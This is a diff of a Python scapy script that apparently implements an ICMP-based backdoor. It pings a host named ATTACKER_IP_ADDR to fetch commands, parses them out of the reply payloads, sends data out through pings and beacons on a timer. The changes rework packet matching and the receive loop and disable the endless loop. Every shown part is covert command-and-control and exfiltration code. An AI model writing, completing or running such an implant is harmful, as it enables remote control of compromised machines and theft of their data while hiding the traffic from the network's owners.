@@ -15,11 +15,12 @@ DEFAULT_TIMEOUT = None
 DEFAULT_PAYLOAD = b''
 
 
-def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=1):
+def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=2):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
-    print("Sending packet:", request.show())
-    return receive_response_packet(timeout, nb_responses)
+    print("Sent packet:")
+    print(request.show())
+    return receive_response_packet(request, timeout, nb_responses)
 
 
 def send_data(ip_addr, id, data):
@@ -41,7 +42,7 @@ def send_data(ip_addr, id, data):
 
 
 def ask_for_command(ip_addr):
-    response = send_ping(ip_addr, ASK_FOR_COMMAND_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT, 2)
+    response = send_ping(ip_addr, ASK_FOR_COMMAND_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
     return retrieve_command(response[1])
 
 
@@ -69,11 +70,15 @@ def retrieve_command(response):
     return response[scapy.ICMP].payload.load.decode("utf-8").split()  # forge_random_command().decode("utf-8").split()
 
 
-def receive_response_packet(timeout, nb_responses):
-    packet = scapy.sniff(filter=f"host {ATTACKER_IP_ADDR} and icmp",
-                       count=nb_responses, timeout=timeout)
-    print("Receiving packet:", packet.show())
-    return packet
+def receive_response_packet(request, timeout, nb_responses):
+    print("Start receiving packets")
+    packets = []
+    for index in range(nb_responses):
+        packets.append(
+            scapy.sniff(stop_filter=lambda response: match_response_to_request(response, request), count=1, timeout=timeout, prn=lambda packet: packet.summary()))
+    print("Received packet:")
+    print(packets[1].show())
+    return packets[1]
 
 
 def can_proceed(ip_addr):
@@ -82,8 +87,9 @@ def can_proceed(ip_addr):
 
 
 def match_response_to_request(response, request):
-    print(response.show(), request.show())
-    return response[scapy.IP].src == request[scapy.IP].dst \
+    # print(response.show(), request.show())
+    return response.haslayer(scapy.ICMP) \
+        and response[scapy.IP].src == request[scapy.IP].dst \
         and response[scapy.IP].dst == request[scapy.IP].src \
         and response[scapy.ICMP] and response[scapy.ICMP].type == 0 \
         and response[scapy.ICMP].id == request[scapy.ICMP].id \
@@ -140,14 +146,14 @@ def forge_random_command():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    while True:
-        #try:
-        if can_proceed(ATTACKER_IP_ADDR):
-            accomplish_routine(ATTACKER_IP_ADDR)
-                #except Exception as err:
-            #print(f"Unexpected {err=}, {type(err)=}")
-            #else:
+    # while True:
+    # try:
+    if can_proceed(ATTACKER_IP_ADDR):
+        accomplish_routine(ATTACKER_IP_ADDR)
+        # except Exception as err:
+        # print(f"Unexpected {err=}, {type(err)=}")
+        # else:
         #    print("Nothing went wrong!")
-        #finally:
+        # finally:
         #    print(f"See you in {FREQUENCY} min(s)")
-        time.sleep(FREQUENCY)
+    time.sleep(FREQUENCY)
